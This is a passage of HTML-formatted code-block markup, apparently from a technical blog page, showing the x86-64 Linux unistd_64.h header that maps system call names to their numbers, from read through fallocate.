class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/include/<span class="keyword">asm</span>/unistd_64.h </span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _ASM_X86_UNISTD_64_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _ASM_X86_UNISTD_64_H 1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_read 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_write 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_open 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_close 3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_stat 4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fstat 5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lstat 6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_poll 7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lseek 8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mmap 9</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mprotect 10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_munmap 11</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_brk 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rt_sigaction 13</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rt_sigprocmask 14</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rt_sigreturn 15</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ioctl 16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pread64 17</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pwrite64 18</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_readv 19</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_writev 20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_access 21</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pipe 22</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_select 23</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_yield 24</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mremap 25</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_msync 26</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mincore 27</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_madvise 28</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_shmget 29</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_shmat 30</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_shmctl 31</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_dup 32</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_dup2 33</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pause 34</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_nanosleep 35</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getitimer 36</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_alarm 37</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setitimer 38</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getpid 39</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sendfile 40</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_socket 41</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_connect 42</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_accept 43</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sendto 44</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_recvfrom 45</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sendmsg 46</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_recvmsg 47</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_shutdown 48</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_bind 49</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_listen 50</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getsockname 51</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getpeername 52</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_socketpair 53</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setsockopt 54</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getsockopt 55</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_clone 56</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fork 57</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_vfork 58</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_execve 59</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_exit 60</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_wait4 61</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_kill 62</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_uname 63</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_semget 64</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_semop 65</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_semctl 66</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_shmdt 67</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_msgget 68</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_msgsnd 69</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_msgrcv 70</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_msgctl 71</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fcntl 72</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_flock 73</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fsync 74</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fdatasync 75</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_truncate 76</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ftruncate 77</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getdents 78</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getcwd 79</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_chdir 80</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fchdir 81</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rename 82</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mkdir 83</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rmdir 84</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_creat 85</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_link 86</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_unlink 87</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_symlink 88</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_readlink 89</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_chmod 90</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fchmod 91</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_chown 92</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fchown 93</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lchown 94</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_umask 95</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_gettimeofday 96</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getrlimit 97</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getrusage 98</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sysinfo 99</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_times 100</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ptrace 101</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getuid 102</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_syslog 103</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getgid 104</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setuid 105</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setgid 106</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_geteuid 107</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getegid 108</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setpgid 109</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getppid 110</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getpgrp 111</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setsid 112</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setreuid 113</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setregid 114</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getgroups 115</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setgroups 116</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setresuid 117</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getresuid 118</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setresgid 119</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getresgid 120</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getpgid 121</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setfsuid 122</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setfsgid 123</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getsid 124</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_capget 125</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_capset 126</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rt_sigpending 127</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rt_sigtimedwait 128</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rt_sigqueueinfo 129</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rt_sigsuspend 130</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sigaltstack 131</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_utime 132</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mknod 133</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_uselib 134</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_personality 135</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ustat 136</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_statfs 137</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fstatfs 138</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sysfs 139</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getpriority 140</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setpriority 141</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_setparam 142</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_getparam 143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_setscheduler 144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_getscheduler 145</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_get_priority_max 146</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_get_priority_min 147</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_rr_get_interval 148</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mlock 149</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_munlock 150</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mlockall 151</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_munlockall 152</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_vhangup 153</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_modify_ldt 154</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pivot_root 155</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR__sysctl 156</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_prctl 157</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_arch_prctl 158</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_adjtimex 159</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setrlimit 160</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_chroot 161</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sync 162</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_acct 163</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_settimeofday 164</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mount 165</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_umount2 166</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_swapon 167</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_swapoff 168</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_reboot 169</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sethostname 170</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setdomainname 171</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_iopl 172</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ioperm 173</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_create_module 174</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_init_module 175</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_delete_module 176</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_get_kernel_syms 177</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_query_module 178</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_quotactl 179</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_nfsservctl 180</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getpmsg 181</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_putpmsg 182</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_afs_syscall 183</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_tuxcall 184</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_security 185</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_gettid 186</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_readahead 187</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setxattr 188</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lsetxattr 189</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fsetxattr 190</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getxattr 191</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lgetxattr 192</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fgetxattr 193</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_listxattr 194</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_llistxattr 195</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_flistxattr 196</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_removexattr 197</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lremovexattr 198</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fremovexattr 199</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_tkill 200</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_time 201</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_futex 202</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_setaffinity 203</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_getaffinity 204</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_set_thread_area 205</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_io_setup 206</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_io_destroy 207</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_io_getevents 208</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_io_submit 209</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_io_cancel 210</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_get_thread_area 211</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lookup_dcookie 212</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_epoll_create 213</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_epoll_ctl_old 214</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_epoll_wait_old 215</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_remap_file_pages 216</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getdents64 217</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_set_tid_address 218</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_restart_syscall 219</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_semtimedop 220</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fadvise64 221</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_timer_create 222</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_timer_settime 223</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_timer_gettime 224</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_timer_getoverrun 225</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_timer_delete 226</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_clock_settime 227</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_clock_gettime 228</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_clock_getres 229</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_clock_nanosleep 230</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_exit_group 231</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_epoll_wait 232</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_epoll_ctl 233</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_tgkill 234</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_utimes 235</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_vserver 236</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mbind 237</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_set_mempolicy 238</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_get_mempolicy 239</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mq_open 240</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mq_unlink 241</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mq_timedsend 242</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mq_timedreceive 243</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mq_notify 244</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mq_getsetattr 245</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_kexec_load 246</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_waitid 247</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_add_key 248</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_request_key 249</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_keyctl 250</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ioprio_set 251</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ioprio_get 252</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_inotify_init 253</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_inotify_add_watch 254</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_inotify_rm_watch 255</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_migrate_pages 256</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_openat 257</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mkdirat 258</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mknodat 259</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fchownat 260</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_futimesat 261</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_newfstatat 262</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_unlinkat 263</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_renameat 264</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_linkat 265</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_symlinkat 266</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_readlinkat 267</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fchmodat 268</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_faccessat 269</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pselect6 270</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ppoll 271</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_unshare 272</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_set_robust_list 273</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_get_robust_list 274</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_splice 275</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_tee 276</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sync_file_range 277</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_vmsplice 278</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_move_pages 279</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_utimensat 280</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_epoll_pwait 281</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_signalfd 282</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_timerfd_create 283</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_eventfd 284</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fallocate 285</span></span><br><span 